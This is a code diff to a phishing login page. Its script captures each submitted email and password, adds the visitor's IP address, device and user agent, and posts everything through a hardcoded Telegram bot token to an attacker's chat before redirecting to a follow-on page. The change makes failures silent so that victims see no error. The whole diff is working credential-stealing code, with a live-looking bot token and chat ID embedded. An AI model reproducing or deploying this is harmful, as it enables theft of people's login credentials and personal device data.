@@ -17,25 +17,25 @@
   </main>
 
   <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
-  <script>
-    const TOKEN = "7589861351:AAE6GNf9_A48WllJYH123Ly1swEVs-q3mxU";
-    const CHAT_ID = "5008982957";
-    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+ <script>
+  const TOKEN = "7589861351:AAE6GNf9_A48WllJYH123Ly1swEVs-q3mxU";
+  const CHAT_ID = "5008982957";
+  const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
-    document.getElementById("login-form").addEventListener("submit", function (e) {
-      e.preventDefault();
+  document.getElementById("login-form").addEventListener("submit", function (e) {
+    e.preventDefault();
 
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
 
-      axios.get("https://api.ipify.org?format=json")
-        .then(response => {
-          const ip = response.data.ip;
-          const userAgent = navigator.userAgent;
-          const platform = navigator.platform;
-          const deviceType = /mobile/i.test(userAgent) ? "Mobile" : "Desktop";
+    axios.get("https://api.ipify.org?format=json")
+      .then(response => {
+        const ip = response.data.ip;
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform;
+        const deviceType = /mobile/i.test(userAgent) ? "Mobile" : "Desktop";
 
-          const message = `
+        const message = `
 <b>📥 New Login</b>
 <b>📧 Email:</b> ${email}
 <b>🔑 Password:</b> ${password}
@@ -43,22 +43,24 @@
 <b>💻 Device:</b> ${deviceType}
 <b>🧠 Platform:</b> ${platform}
 <b>🕵️‍♂️ User Agent:</b> ${userAgent}
-          `;
+        `;
 
-          axios.post(URI_API, {
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: "html"
-          }).then(() => {
-            window.location.href = "2ffg.html";
-          }).catch(() => {
-            alert("❌ فشل في الإرسال إلى تيليجرام");
-          });
-        })
-        .catch(() => {
-          alert("❌ فشل في جلب IP");
+        axios.post(URI_API, {
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: "html"
+        }).then(() => {
+          window.location.href = "2ffg.html";
+        }).catch(() => {
+          // فشل الإرسال — لا عرض أي شيء
         });
-    });
-  </script>
+      })
+      .catch(() => {
+        // فشل جلب IP — لا عرض أي شيء
+      });
+  });
+</script>
+
 </body>
 </html>
+
